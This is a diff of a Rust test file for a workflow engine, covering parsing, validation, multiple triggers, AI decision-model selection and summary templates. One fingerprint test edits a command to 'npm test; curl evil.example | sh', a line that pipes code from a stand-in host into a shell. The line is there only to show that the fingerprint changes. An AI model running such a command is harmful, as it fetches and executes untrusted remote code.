@@ -1,5 +1,5 @@
 //! Ports of `workflow.test.ts` and `workflowParse.test.ts`, plus the Rust-specific checks
-//! (JSON shape, order, fingerprint parity with the React code, matchers).
+//! (JSON shape, order, fingerprints pinned to the Rust output, matchers).
 use super::condition::{condition_syntax_problem, eval_condition, parse_condition, Operand};
 use super::fixtures::*;
 use super::model::*;
@@ -11,7 +11,8 @@ use super::template::{
     template_vars,
 };
 use super::validate::{
-    find_absolute_path, is_cli_name, is_env_name, validate_workflow, WorkflowIssue,
+    decision_model_for, find_absolute_path, is_cli_name, is_env_name, validate_workflow,
+    DecisionModelSource, WorkflowIssue,
 };
 use serde_json::{json, Value};
 
@@ -39,11 +40,8 @@ fn node_mut<'a>(w: &'a mut Workflow, id: &str) -> &'a mut Node {
     w.nodes.iter_mut().find(|n| n.id == id).unwrap()
 }
 
-fn set_report_template(w: &mut Workflow, text: &str) {
-    match &mut node_mut(w, "report").kind {
-        NodeKind::Report { template } => *template = Some(text.to_string()),
-        _ => unreachable!(),
-    }
+fn set_summary_template(w: &mut Workflow, text: &str) {
+    w.summary_template = Some(text.to_string());
 }
 
 fn loop_edge(w: &mut Workflow) -> &mut LoopSpec {
@@ -83,16 +81,12 @@ fn fingerprint_does_not_change_when_only_board_positions_change() {
 fn fingerprint_changes_when_a_command_changes() {
     let mut w = ticket_workflow();
     w.nodes = vec![
-        node(r#"{"id":"trigger","type":"manual"}"#),
+        node(r#"{"id":"start","type":"manual"}"#),
         node(
             r#"{"id":"build","type":"command","project":"{{inputs.project}}","command":"npm test"}"#,
         ),
-        node(r#"{"id":"report","type":"report"}"#),
     ];
-    w.edges = vec![
-        edge(r#"{"from":"trigger","to":"build"}"#),
-        edge(r#"{"from":"build","to":"report"}"#),
-    ];
+    w.edges = vec![edge(r#"{"from":"start","to":"build"}"#)];
     let mut edited = w.clone();
     match &mut node_mut(&mut edited, "build").kind {
         NodeKind::Command { command, .. } => *command = "npm test; curl evil.example | sh".into(),
@@ -110,7 +104,7 @@ fn fingerprint_changes_with_a_prompt_a_title_a_loop_the_name_the_description_or_
     let mut looped = w.clone();
     *loop_edge(&mut looped) = LoopSpec {
         max_rounds: 9.0,
-        decide: "mono".into(),
+        decide: "ai".into(),
     };
     let mut renamed = w.clone();
     renamed.name = "Other".into();
@@ -265,8 +259,8 @@ fn a_run_round_trips_with_string_session_ids() {
     let raw = json!({
         "id": "run-1", "workflowId": "wf-abcd1234",
         "definition": serde_json::from_str::<Value>(EXAMPLE_JSON).unwrap(),
-        "status": "doneWithFailures", "startedAt": 5, "endedAt": 9, "trigger": "cli",
-        "folderId": "f1",
+        "status": "doneWithFailures", "startedAt": 5, "endedAt": 9,
+        "caller": {"kind": "mono", "monoId": "m-1", "triggerNode": "start", "item": {"ref": "CU-1"}},
         "items": { "each": [{"title": "a"}], "each@r1": [] },
         "nodes": [{
             "nodeId": "dev", "branch": "each#0", "status": "waitingApproval", "round": 2,
@@ -279,12 +273,37 @@ fn a_run_round_trips_with_string_session_ids() {
     let run: WorkflowRun = serde_json::from_value(raw.clone()).unwrap();
     assert_eq!(run.nodes[0].session_id.as_deref(), Some("abc-123"));
     assert_eq!(run.status, RunStatus::DoneWithFailures);
-    assert_eq!(run.trigger, RunTrigger::Cli);
+    assert_eq!(
+        run.caller,
+        RunCaller {
+            kind: CallerKind::Mono,
+            mono_id: Some("m-1".into()),
+            trigger_node: "start".into(),
+            item: Json::parse(r#"{"ref":"CU-1"}"#),
+        }
+    );
     let mut back = serde_json::to_value(&run).unwrap();
     // The definition is re-written from the lenient parse, which adds nothing the fixture lacks.
     assert_eq!(back["definition"], raw["definition"]);
     back["definition"] = raw["definition"].clone();
     assert_eq!(back, raw);
+}
+
+#[test]
+fn a_run_file_written_with_the_old_folder_field_still_parses() {
+    let raw = json!({
+        "id": "run-1", "workflowId": "wf-abcd1234",
+        "definition": serde_json::from_str::<Value>(EXAMPLE_JSON).unwrap(),
+        "status": "done", "startedAt": 5,
+        "caller": {"kind": "manual", "triggerNode": "start"},
+        "folderId": "f1", "items": {}, "nodes": []
+    });
+    let run: WorkflowRun = serde_json::from_value(raw).unwrap();
+    assert_eq!(run.id, "run-1");
+    assert!(serde_json::to_value(&run)
+        .unwrap()
+        .get("folderId")
+        .is_none());
 }
 
 // ---------------------------------------------------------------------------------------------
@@ -304,12 +323,26 @@ fn new_workflow_id_is_wf_plus_8_base36_chars() {
 }
 
 #[test]
-fn trigger_of_finds_the_trigger() {
+fn triggers_lists_every_trigger_in_order() {
     assert_eq!(
-        trigger_of(&example()).map(|n| n.id.as_str()),
-        Some("trigger")
+        example()
+            .triggers()
+            .iter()
+            .map(|n| n.id.as_str())
+            .collect::<Vec<_>>(),
+        ["start"]
     );
-    assert!(trigger_of(&Workflow::new("wf-aaaaaaaa", "x")).is_none());
+    assert!(Workflow::new("wf-aaaaaaaa", "x").triggers().is_empty());
+    assert!(Workflow::new("wf-aaaaaaaa", "x").first_trigger().is_none());
+    let mut many = example();
+    many.nodes.push(node(r#"{"id":"hand","type":"manual"}"#));
+    assert_eq!(
+        many.triggers()
+            .iter()
+            .map(|n| n.id.as_str())
+            .collect::<Vec<_>>(),
+        ["start", "hand"]
+    );
 }
 
 #[test]
@@ -481,7 +514,7 @@ fn fills_defaults_for_a_bare_entry() {
 fn needs_review_is_kept_when_true_and_dropped_otherwise() {
     let entry = |extra: &str| {
         format!(
-            r#"[{{"id":"wf-abcd1234","name":"x","nodes":[{{"id":"trigger","type":"manual"}}],"edges":[]{extra}}}]"#
+            r#"[{{"id":"wf-abcd1234","name":"x","nodes":[{{"id":"start","type":"manual"}}],"edges":[]{extra}}}]"#
         )
     };
     assert!(parse_workflows(&entry(r#","needsReview":true"#))[0].needs_review);
@@ -548,7 +581,9 @@ fn a_node_or_edge_that_cannot_be_read_makes_the_entry_unreadable() {
         (format!("[{node_ok},{{\"id\":\"s\",\"type\":\"session\",\"project\":\"p\"}}]"), "[]"),
         (format!("[{node_ok},{{\"id\":\"c\",\"type\":\"command\",\"project\":\"p\"}}]"), "[]"),
         (format!("[{node_ok},{{\"id\":\"s\",\"type\":\"session\",\"project\":\"p\",\"prompt\":\"x\",\"checkout\":\"elsewhere\"}}]"), "[]"),
-        (format!("[{node_ok},{{\"id\":\"a\",\"type\":\"askMono\",\"question\":\"q\"}}]"), "[]"),
+        // The nodes this app no longer has leave the entry unreadable (kept as written).
+        (format!("[{node_ok},{{\"id\":\"a\",\"type\":\"askMono\",\"question\":\"q\",\"answers\":[\"a\"]}}]"), "[]"),
+        (format!("[{node_ok},{{\"id\":\"r\",\"type\":\"report\"}}]"), "[]"),
         (format!("[{node_ok},{{\"id\":\"f\",\"type\":\"forEach\"}}]"), "[]"),
         (format!("[{node_ok},{{\"id\":\"s\",\"type\":\"schedule\"}}]"), "[]"),
         (format!("[{node_ok},{{\"id\":\"s\",\"type\":\"schedule\",\"schedule\":{{\"scheduleKind\":\"\"}}}}]"), "[]"),
@@ -557,7 +592,7 @@ fn a_node_or_edge_that_cannot_be_read_makes_the_entry_unreadable() {
         (format!("[{node_ok},{{\"id\":\"q\",\"type\":\"nope\"}}]"), "[]"),
         (format!("[{node_ok},5]"), "[]"),
         (format!("[{node_ok}]"), r#"[{"from":"t"}]"#),
-        (format!("[{node_ok}]"), r#"[{"from":"t","to":"t","loop":{"maxRounds":"3","decide":"mono"}}]"#),
+        (format!("[{node_ok}]"), r#"[{"from":"t","to":"t","loop":{"maxRounds":"3","decide":"ai"}}]"#),
         (format!("[{node_ok}]"), r#"[{"from":"t","to":"t","loop":null}]"#),
         (format!("[{node_ok}]"), "[3]"),
     ] {
@@ -591,8 +626,8 @@ fn lenient_parts_that_are_dropped_not_fatal() {
     );
     let c = node(r#"{"id":"c","type":"command","project":"p","command":"x","cwd":"elsewhere"}"#);
     assert!(matches!(c.kind, NodeKind::Command { cwd: None, .. }));
-    let a = node(r#"{"id":"a","type":"askMono","question":"q","answers":["a",3,null,"b"]}"#);
-    assert!(matches!(&a.kind, NodeKind::AskMono { answers, .. } if answers == &["a", "b"]));
+    let a = node(r#"{"id":"a","type":"switch","decide":"ai","cases":["a",3,null,"b"]}"#);
+    assert!(matches!(&a.kind, NodeKind::Switch { cases, .. } if cases == &["a", "b"]));
     let i = node(r#"{"id":"i","type":"if","decide":"human"}"#);
     assert!(matches!(i.kind, NodeKind::If { decide: None, .. }));
     let e = edge(r#"{"from":"a","to":"b","handle":"maybe"}"#);
@@ -629,46 +664,79 @@ fn accepts_loop_review_to_dev_inside_for_each() {
     assert_eq!(validate_workflow(&example()), vec![]);
 }
 
-#[test]
-fn flags_two_triggers() {
+/// The example with `count` triggers in all, every one leading to `fetch` (the first step).
+fn with_triggers(count: usize) -> Workflow {
     let mut w = example();
-    w.nodes.push(node(r#"{"id":"again","type":"manual"}"#));
-    assert!(flags(&w, "exactly one trigger"));
+    for i in 2..=count {
+        let id = format!("t{i}");
+        w.nodes
+            .push(node(&format!(r#"{{"id":"{id}","type":"manual"}}"#)));
+        w.edges
+            .push(edge(&format!(r#"{{"from":"{id}","to":"fetch"}}"#)));
+    }
+    w
+}
+
+#[test]
+fn a_workflow_may_have_one_to_five_triggers_that_lead_to_the_same_first_step() {
+    for count in 1..=5 {
+        let w = with_triggers(count);
+        assert_eq!(w.triggers().len(), count);
+        assert_eq!(validate_workflow(&w), [], "{count} triggers");
+    }
 }
 
 #[test]
 fn flags_no_trigger() {
     let mut w = example();
-    w.nodes.retain(|n| n.id != "trigger");
-    w.edges.retain(|e| e.from != "trigger");
-    assert!(flags(&w, "exactly one trigger"));
-    assert!(messages(&w).contains(&"A workflow needs exactly one trigger (found 0)".to_string()));
+    w.nodes.retain(|n| n.id != "start");
+    w.edges.retain(|e| e.from != "start");
+    assert!(messages(&w).contains(&"A workflow needs at least one trigger (found 0)".to_string()));
 }
 
 #[test]
-fn flags_missing_report() {
-    let mut w = example();
-    w.nodes.retain(|n| n.id != "report");
-    w.edges.retain(|e| e.to != "report");
-    assert!(flags(&w, "exactly one Report node"));
+fn flags_six_triggers() {
+    let w = with_triggers(6);
+    assert!(messages(&w).contains(&"A workflow can have at most 5 triggers (found 6)".to_string()));
 }
 
 #[test]
-fn flags_two_report_nodes() {
-    let mut w = example();
-    w.nodes.push(node(r#"{"id":"report2","type":"report"}"#));
-    assert!(flags(&w, "exactly one Report node"));
+fn schedule_and_manual_triggers_mix_and_several_schedules_are_fine() {
+    let mut w = with_triggers(1);
+    for (id, time) in [("morning", "08:00"), ("evening", "18:00")] {
+        w.nodes.push(node(&format!(
+            r#"{{"id":"{id}","type":"schedule","schedule":{{"scheduleKind":"daily","time":"{time}","minute":0,"dayOfWeek":1}}}}"#
+        )));
+        w.edges
+            .push(edge(&format!(r#"{{"from":"{id}","to":"fetch"}}"#)));
+    }
+    assert_eq!(w.triggers().len(), 3);
+    assert_eq!(validate_workflow(&w), []);
 }
 
 #[test]
-fn flags_a_report_the_trigger_cannot_reach() {
-    let mut w = example();
-    w.edges.retain(|e| e.to != "report");
-    assert!(flags(&w, "reachable from the trigger"));
+fn flags_triggers_that_do_not_lead_to_the_same_first_step() {
+    let mut w = with_triggers(2);
+    w.edges.retain(|e| e.from != "t2");
+    w.edges.push(edge(r#"{"from":"t2","to":"each"}"#));
+    let issues = validate_workflow(&w);
+    assert!(flags(&w, "every trigger must lead to the same first step"));
     assert_eq!(
-        issue_node(&validate_workflow(&w), "reachable from the trigger"),
-        Some("report")
+        issue_node(&issues, "every trigger must lead to the same first step"),
+        Some("t2")
     );
+}
+
+#[test]
+fn flags_a_trigger_that_is_not_connected_when_there_are_several() {
+    let mut w = with_triggers(2);
+    w.edges.retain(|e| e.from != "t2");
+    assert!(flags(&w, "Trigger \"t2\" is not connected"));
+    // A lone trigger with nothing after it is a draft, not an error of its own.
+    let mut lone = example();
+    lone.nodes.retain(|n| n.id == "start");
+    lone.edges.clear();
+    assert_eq!(validate_workflow(&lone), []);
 }
 
 #[test]
@@ -685,7 +753,7 @@ fn flags_a_loop_edge_to_a_non_ancestor() {
     let mut w = example();
     w.edges.retain(|e| e.loop_spec.is_none());
     w.edges.push(edge(
-        r#"{"from":"dev","to":"review","loop":{"maxRounds":3,"decide":"mono"}}"#,
+        r#"{"from":"dev","to":"review","loop":{"maxRounds":3,"decide":"ai"}}"#,
     ));
     assert!(flags(&w, "ancestor"));
 }
@@ -695,7 +763,7 @@ fn flags_a_loop_edge_that_crosses_a_for_each_boundary() {
     let mut w = example();
     w.edges.retain(|e| e.loop_spec.is_none());
     w.edges.push(edge(
-        r#"{"from":"review","to":"fetch","loop":{"maxRounds":3,"decide":"mono"}}"#,
+        r#"{"from":"review","to":"fetch","loop":{"maxRounds":3,"decide":"ai"}}"#,
     ));
     assert!(flags(&w, "same For each"));
 }
@@ -705,22 +773,28 @@ fn flags_a_loop_edge_that_starts_at_a_node_that_cannot_loop() {
     let mut w = example();
     w.edges.retain(|e| e.loop_spec.is_none());
     w.edges.push(edge(
-        r#"{"from":"each","to":"fetch","loop":{"maxRounds":3,"decide":"mono"}}"#,
+        r#"{"from":"each","to":"fetch","loop":{"maxRounds":3,"decide":"ai"}}"#,
     ));
-    assert!(flags(&w, "session, command or Ask Mono"));
+    assert!(flags(
+        &w,
+        "a loop can only start from a session or command node"
+    ));
     let mut t = example();
     t.edges.retain(|e| e.loop_spec.is_none());
     t.edges.push(edge(
-        r#"{"from":"trigger","to":"trigger","loop":{"maxRounds":3,"decide":"mono"}}"#,
+        r#"{"from":"start","to":"start","loop":{"maxRounds":3,"decide":"ai"}}"#,
     ));
-    assert!(flags(&t, "session, command or Ask Mono"));
+    assert!(flags(
+        &t,
+        "a loop can only start from a session or command node"
+    ));
 }
 
 #[test]
 fn flags_a_node_that_is_the_source_of_two_loop_edges() {
     let mut w = example();
     w.edges.push(edge(
-        r#"{"from":"review","to":"dev","loop":{"maxRounds":2,"decide":"mono"}}"#,
+        r#"{"from":"review","to":"dev","loop":{"maxRounds":2,"decide":"ai"}}"#,
     ));
     assert_eq!(
         messages(&w)
@@ -731,18 +805,157 @@ fn flags_a_node_that_is_the_source_of_two_loop_edges() {
     );
 }
 
+// --- decide "ai": which model answers ----------------------------------------------------------
+
+/// trigger -> a (session with a model) -> b (session) -> gate (If, decide ai).
+fn ai_gate(a_model: &str) -> Workflow {
+    workflow_from(&format!(
+        r#"{{"id":"wf-aaaaaaaa","name":"Gate","inputs":{{"project":{{"type":"project"}}}},
+            "inputValues":{{"project":"/x"}},
+            "nodes":[{{"id":"start","type":"manual"}},
+              {{"id":"a","type":"session","project":"{{{{inputs.project}}}}","prompt":"a","checkout":"root","output":{{}}{a_model}}},
+              {{"id":"b","type":"session","project":"{{{{inputs.project}}}}","prompt":"b","checkout":"root","output":{{}},"model":"claude:opus-5"}},
+              {{"id":"gate","type":"if","decide":"ai"}}],
+            "edges":[{{"from":"start","to":"a"}},{{"from":"a","to":"b"}},{{"from":"b","to":"gate"}}],
+            "enabled":false,"createdAt":0}}"#
+    ))
+}
+
 #[test]
-fn flags_a_report_node_with_outgoing_edges_or_a_parent() {
+fn an_ai_decision_uses_the_decision_model_when_the_workflow_sets_one() {
+    let mut w = ai_gate(r#","model":"claude:sonnet-5""#);
+    w.decision_model = Some(DecisionModel {
+        harness: "codex".into(),
+        model: "codex:gpt-5".into(),
+        effort: Some("low".into()),
+    });
+    let got = decision_model_for(&w, "gate").unwrap();
+    assert_eq!(got.source, DecisionModelSource::Workflow);
+    assert_eq!(
+        (
+            got.harness.as_deref(),
+            got.model.as_deref(),
+            got.effort.as_deref()
+        ),
+        (Some("codex"), Some("codex:gpt-5"), Some("low"))
+    );
+    assert_eq!(validate_workflow(&w), []);
+}
+
+#[test]
+fn an_ai_decision_without_a_decision_model_uses_the_nearest_upstream_session() {
+    let w = ai_gate(r#","model":"claude:sonnet-5""#);
+    let got = decision_model_for(&w, "gate").unwrap();
+    // `b` is nearer to the gate than `a`.
+    assert_eq!(got.source, DecisionModelSource::Session("b".into()));
+    assert_eq!(got.model.as_deref(), Some("claude:opus-5"));
+    assert_eq!(validate_workflow(&w), []);
+    // A session that sets nothing still counts: it runs on the app's default, resolved later.
+    let mut bare = ai_gate("");
+    bare.nodes.retain(|n| n.id != "b");
+    bare.edges = vec![
+        edge(r#"{"from":"start","to":"a"}"#),
+        edge(r#"{"from":"a","to":"gate"}"#),
+    ];
+    let got = decision_model_for(&bare, "gate").unwrap();
+    assert_eq!(got.source, DecisionModelSource::Session("a".into()));
+    assert_eq!((got.harness, got.model, got.effort), (None, None, None));
+}
+
+#[test]
+fn an_ai_decision_with_neither_a_decision_model_nor_an_upstream_session_fails_validation() {
+    let mut w = ai_gate("");
+    w.nodes.retain(|n| !matches!(n.id.as_str(), "a" | "b"));
+    w.edges = vec![edge(r#"{"from":"start","to":"gate"}"#)];
+    assert_eq!(decision_model_for(&w, "gate"), None);
+    let issues = validate_workflow(&w);
+    assert_eq!(
+        issue_node(&issues, "decides with AI but no model is set"),
+        Some("gate")
+    );
+    // A session AFTER the question is not upstream of it.
+    let mut after = w.clone();
+    after.nodes.push(node(
+        r#"{"id":"late","type":"session","project":"{{inputs.project}}","prompt":"x","checkout":"root","output":{}}"#,
+    ));
+    after
+        .edges
+        .push(edge(r#"{"from":"gate","to":"late","handle":"true"}"#));
+    assert_eq!(decision_model_for(&after, "gate"), None);
+    // Setting the decision model fixes it.
+    w.decision_model = Some(DecisionModel {
+        harness: "claude".into(),
+        model: "claude:sonnet-5".into(),
+        effort: None,
+    });
+    assert_eq!(validate_workflow(&w), []);
+}
+
+#[test]
+fn a_switch_and_a_loop_edge_that_decide_with_ai_need_a_model_too() {
+    let switch = workflow_from(
+        r#"{"id":"wf-aaaaaaaa","name":"S","nodes":[{"id":"start","type":"manual"},
+            {"id":"route","type":"switch","decide":"ai","cases":["x"]}],
+            "edges":[{"from":"start","to":"route"}]}"#,
+    );
+    assert!(flags(
+        &switch,
+        "The Switch node \"route\" decides with AI but no model is set"
+    ));
+    let mut looped = example();
+    loop_edge(&mut looped).decide = "ai".into();
+    // `review` is a session in the example, so the loop edge has its own model to ask.
+    assert_eq!(validate_workflow(&looped), []);
+    looped.nodes.retain(|n| n.id != "review");
+    looped.edges.retain(|e| e.loop_spec.is_none());
+    let nearest = decision_model_for(&looped, "dev").unwrap();
+    assert_eq!(nearest.source, DecisionModelSource::Session("dev".into()));
+}
+
+#[test]
+fn the_nearest_upstream_session_inside_a_for_each_falls_back_to_the_one_before_the_group() {
+    // `dev` and `review` sit inside `each`; a decision on a child of the group with no session
+    // before it in the group looks upstream of the group.
     let mut w = example();
     w.nodes.push(node(
-        r#"{"id":"after","type":"command","project":"{{inputs.project}}","command":"true"}"#,
+        r#"{"id":"pick","type":"if","parent":"each","decide":"ai"}"#,
     ));
-    w.edges.push(edge(r#"{"from":"report","to":"after"}"#));
-    assert!(flags(&w, "leaves the Report node"));
-    assert!(flags(
-        &patch_node(&example(), "report", r#"{"parent":"each"}"#),
-        "cannot be inside a For each"
-    ));
+    let got = decision_model_for(&w, "pick").unwrap();
+    assert_eq!(got.source, DecisionModelSource::Session("fetch".into()));
+}
+
+#[test]
+fn mono_is_read_as_an_alias_of_ai_everywhere_a_decider_is_written() {
+    let w = workflow_from(
+        r#"{"id":"wf-aaaaaaaa","name":"Alias","inputs":{"project":{"type":"project"}},
+            "inputValues":{"project":"/x"},
+            "nodes":[{"id":"start","type":"manual"},
+              {"id":"s","type":"session","project":"{{inputs.project}}","prompt":"p","checkout":"root","output":{}},
+              {"id":"gate","type":"if","decide":"mono"},
+              {"id":"route","type":"switch","decide":"mono","cases":["a"]}],
+            "edges":[{"from":"start","to":"s"},{"from":"s","to":"gate"},{"from":"s","to":"route","handle":null},
+              {"from":"s","to":"s","loop":{"maxRounds":2,"decide":"mono"}}]}"#,
+    );
+    for id in ["gate", "route"] {
+        let kind = &w.node(id).unwrap().kind;
+        assert!(
+            matches!(
+                kind,
+                NodeKind::If {
+                    decide: Some(Decide::Ai),
+                    ..
+                } | NodeKind::Switch {
+                    decide: Some(Decide::Ai),
+                    ..
+                }
+            ),
+            "{id}"
+        );
+    }
+    assert_eq!(loop_edge(&mut w.clone()).decide, "ai");
+    // Written back as "ai".
+    assert!(text(&w).contains(r#""decide":"ai""#));
+    assert!(!text(&w).contains(r#""decide":"mono""#));
 }
 
 #[test]
@@ -843,19 +1056,19 @@ fn accepts_run_round_run_id_and_run_started_at_anywhere() {
 }
 
 #[test]
-fn resolves_command_outputs_ask_mono_outputs_and_for_each_results() {
+fn resolves_command_outputs_and_for_each_results() {
     let mut w = example();
     w.nodes.push(node(
         r#"{"id":"lint","type":"command","project":"{{inputs.project}}","command":"make lint"}"#,
     ));
-    w.nodes.push(node(r#"{"id":"ask","type":"askMono","question":"Exit {{lint.exitCode}}?","answers":["yes","no"]}"#));
+    w.nodes.push(node(
+        r#"{"id":"ask","type":"switch","decide":"ai","question":"Exit {{lint.exitCode}}?","cases":["yes","no"]}"#,
+    ));
     w.edges.push(edge(r#"{"from":"fetch","to":"lint"}"#));
     w.edges.push(edge(r#"{"from":"lint","to":"ask"}"#));
-    w.edges.push(edge(r#"{"from":"ask","to":"report"}"#));
-    set_report_template(
-        &mut w,
-        "{{ask.answer}} {{ask.reason}} {{each.results}} {{lint.stderr}}",
-    );
+    w.edges
+        .push(edge(r#"{"from":"ask","to":"report","handle":"yes"}"#));
+    set_summary_template(&mut w, "{{lint.exitCode}} {{each.results}} {{lint.stderr}}");
     assert_eq!(validate_workflow(&w), vec![]);
     assert!(flags(
         &patch_node(&w, "ask", r#"{"question":"{{lint.nope}}"}"#),
@@ -864,32 +1077,29 @@ fn resolves_command_outputs_ask_mono_outputs_and_for_each_results() {
 }
 
 #[test]
-fn accepts_a_report_reading_a_top_level_session_upstream_through_an_if() {
+fn accepts_a_summary_reading_a_top_level_session_upstream_through_an_if() {
     let w = workflow_from(
         r#"{
           "id": "wf-weather1", "name": "Weather",
           "inputs": { "project": { "type": "project" } },
           "inputValues": { "project": "/Users/x/repo" },
           "nodes": [
-            { "id": "trigger", "type": "manual" },
+            { "id": "start", "type": "manual" },
             { "id": "session", "type": "session", "project": "{{inputs.project}}", "checkout": "root",
               "prompt": "Do session", "output": { "weather": { "type": "string" }, "summary": { "type": "string" } } },
             { "id": "gate", "type": "if", "condition": "{{session.weather}} == \"rain\"" },
             { "id": "session_2", "type": "session", "project": "{{inputs.project}}", "checkout": "root",
               "prompt": "Do session_2", "output": {} },
             { "id": "session_3", "type": "session", "project": "{{inputs.project}}", "checkout": "root",
-              "prompt": "Do session_3", "output": {} },
-            { "id": "report", "type": "report",
-              "template": "Da Nang: {{session.weather}}. {{session.summary}} ({{run.status}})" }
+              "prompt": "Do session_3", "output": {} }
           ],
           "edges": [
-            { "from": "trigger", "to": "session" },
+            { "from": "start", "to": "session" },
             { "from": "session", "to": "gate" },
             { "from": "gate", "to": "session_2", "handle": "true" },
-            { "from": "gate", "to": "session_3", "handle": "false" },
-            { "from": "session_2", "to": "report" },
-            { "from": "session_3", "to": "report" }
+            { "from": "gate", "to": "session_3", "handle": "false" }
           ],
+          "summaryTemplate": "Da Nang: {{session.weather}}. {{session.summary}} ({{run.status}})",
           "enabled": true, "createdAt": 1
         }"#,
     );
@@ -914,45 +1124,45 @@ fn rejects_reserved_names_as_a_for_each_loop_variable() {
 }
 
 #[test]
-fn keeps_the_extra_run_fields_out_of_non_report_templates() {
+fn keeps_the_extra_run_fields_out_of_non_summary_templates() {
     let w = patch_node(&example(), "fetch", r#"{"prompt":"{{run.status}}"}"#);
     assert!(flags(&w, "{{run.status}}"));
 }
 
 #[test]
-fn limits_report_templates_to_variables_the_report_can_read() {
+fn limits_the_summary_template_to_variables_the_summary_can_read() {
     let with_template = |template: &str| {
         let mut w = example();
-        set_report_template(&mut w, template);
+        set_summary_template(&mut w, template);
         w
     };
     // Readable: inputs, run, results (and its fields), top-level nodes with a declared field.
     let ok = with_template(
-        "{{inputs.project}} {{run.id}} {{run.round}} {{run.status}} {{run.statusLabel}} {{run.name}} {{run.endedAt}} {{results}} {{results.0.status}} {{fetch.tickets}} {{each.results}}",
+        "{{inputs.project}} {{run.id}} {{run.round}} {{run.status}} {{run.statusLabel}} {{run.name}} {{run.endedAt}} {{results}} {{results.0.status}} {{fetch.tickets}} {{each.results}} {{trigger.kind}} {{trigger.node}} {{trigger.item.title}}",
     );
     assert_eq!(validate_workflow(&ok), vec![]);
     // A step inside a For each is only reachable through results.
     assert!(messages(&with_template("{{dev.pr_url}}")).contains(
-        &r#"The report cannot read "dev.pr_url": steps inside a For each are listed in {{results}} (or use {{each.results}})."#.to_string()
+        &r#"The summary cannot read "dev.pr_url": steps inside a For each are listed in {{results}} (or use {{each.results}})."#.to_string()
     ));
     assert!(flags(
         &with_template("{{dev}}"),
-        r#"The report cannot read "dev""#
+        r#"The summary cannot read "dev""#
     ));
     // The loop variable only exists inside the For each.
     assert!(flags(
         &with_template("{{item.title}}"),
-        r#"The report cannot read "item.title""#
+        r#"The summary cannot read "item.title""#
     ));
     assert!(messages(&with_template("{{item.title}}")).contains(
-        &r#"The report cannot read "item.title": the loop variable only exists inside a For each; use {{results}}."#.to_string()
+        &r#"The summary cannot read "item.title": the loop variable only exists inside a For each; use {{results}}."#.to_string()
     ));
     // Undeclared fields of top-level nodes are still caught.
     assert!(flags(&with_template("{{fetch.nope}}"), "{{fetch.nope}}"));
     // The conditions of #if blocks are checked too.
     assert!(flags(
         &with_template("{{#if dev.verdict}}x{{/if}}"),
-        r#"The report cannot read "dev.verdict""#
+        r#"The summary cannot read "dev.verdict""#
     ));
 }
 
@@ -1118,10 +1328,10 @@ fn flags_an_if_with_both_or_neither_of_condition_and_decide() {
     base.nodes.push(node(r#"{"id":"gate","type":"if"}"#));
     base.edges.push(edge(r#"{"from":"fetch","to":"gate"}"#));
     assert!(flags(&base, "condition or decide"));
-    let both = patch_node(&base, "gate", r#"{"condition":"a == b","decide":"mono"}"#);
+    let both = patch_node(&base, "gate", r#"{"condition":"a == b","decide":"ai"}"#);
     assert!(flags(&both, "condition or decide"));
     assert_eq!(
-        validate_workflow(&patch_node(&base, "gate", r#"{"decide":"mono"}"#)),
+        validate_workflow(&patch_node(&base, "gate", r#"{"decide":"ai"}"#)),
         vec![]
     );
     // A blank condition counts as none.
@@ -1209,7 +1419,7 @@ fn rejects_node_ids_that_would_shadow_template_variables() {
 fn flags_an_invalid_schedule() {
     let w = patch_node(
         &example(),
-        "trigger",
+        "start",
         r#"{"schedule":{"scheduleKind":"monthly","time":"9am","minute":0,"dayOfWeek":1}}"#,
     );
     assert!(flags(&w, "schedule"));
@@ -1222,7 +1432,7 @@ fn flags_an_invalid_schedule() {
 #[test]
 fn schedule_errors_match_the_habit_schedule_messages() {
     let schedule = |body: &str| {
-        let w = patch_node(&example(), "trigger", &format!(r#"{{"schedule":{body}}}"#));
+        let w = patch_node(&example(), "start", &format!(r#"{{"schedule":{body}}}"#));
         messages(&w)
     };
     assert_eq!(
@@ -1270,7 +1480,7 @@ fn schedule_errors_match_the_habit_schedule_messages() {
 fn accepts_an_interval_schedule() {
     let w = patch_node(
         &example(),
-        "trigger",
+        "start",
         r#"{"schedule":{"scheduleKind":"interval","time":"00:00","minute":0,"dayOfWeek":1,"intervalHours":6,"intervalFrom":"2026-01-01"}}"#,
     );
     assert_eq!(validate_workflow(&w), vec![]);
@@ -1285,13 +1495,13 @@ fn flags_input_names_that_cannot_be_used_in_a_variable() {
 }
 
 #[test]
-fn flags_an_empty_ask_mono_answer_list_and_an_empty_for_each_list_expression() {
+fn flags_an_empty_switch_case_list_and_an_empty_for_each_list_expression() {
     let mut w = example();
     w.nodes.push(node(
-        r#"{"id":"ask","type":"askMono","question":"ok?","answers":[]}"#,
+        r#"{"id":"ask","type":"switch","decide":"ai","question":"ok?","cases":[]}"#,
     ));
     w.edges.push(edge(r#"{"from":"fetch","to":"ask"}"#));
-    assert!(flags(&w, "answer"));
+    assert!(flags(&w, "at least one case"));
     assert!(flags(
         &patch_node(&example(), "each", r#"{"in":""}"#),
         "input list"
@@ -1318,7 +1528,7 @@ fn never_panics_on_a_workflow_with_odd_fields() {
     ];
     odd.edges = vec![
         edge(r#"{"from":"a","to":"a","loop":{"maxRounds":1,"decide":""}}"#),
-        edge(r#"{"from":"c","to":"zzz","loop":{"maxRounds":1,"decide":"mono"}}"#),
+        edge(r#"{"from":"c","to":"zzz","loop":{"maxRounds":1,"decide":"ai"}}"#),
     ];
     assert!(!validate_workflow(&odd).is_empty());
 }
@@ -2769,7 +2979,7 @@ fn a_switch_with_cases_and_matching_handles_is_valid() {
         validate_workflow(&with_switch(SWITCH_OK, &["bug", "feature", "default"])),
         vec![]
     );
-    let mono = r#""decide":"mono","question":"Which?","cases":["bug"]"#;
+    let mono = r#""decide":"ai","question":"Which?","cases":["bug"]"#;
     assert_eq!(validate_workflow(&with_switch(mono, &["bug"])), vec![]);
 }
 
@@ -2811,7 +3021,7 @@ fn flags_a_switch_with_both_or_neither_of_value_and_decide() {
         "value or decide"
     ));
     assert!(flags(
-        &with_switch(r#""value":"x","decide":"mono","cases":["a"]"#, &["a"]),
+        &with_switch(r#""value":"x","decide":"ai","cases":["a"]"#, &["a"]),
         "value or decide"
     ));
 }
@@ -2882,7 +3092,7 @@ fn a_stray_handle_on_a_plain_or_loop_edge_is_dropped_when_a_workflow_is_read() {
 fn a_stray_handle_on_a_loop_edge_of_a_switch_is_dropped() {
     let mut w = with_switch(SWITCH_OK, &["bug", "feature", "default"]);
     w.edges.push(edge(
-        r#"{"from":"route","to":"fetch","loop":{"maxRounds":2,"decide":"mono"}}"#,
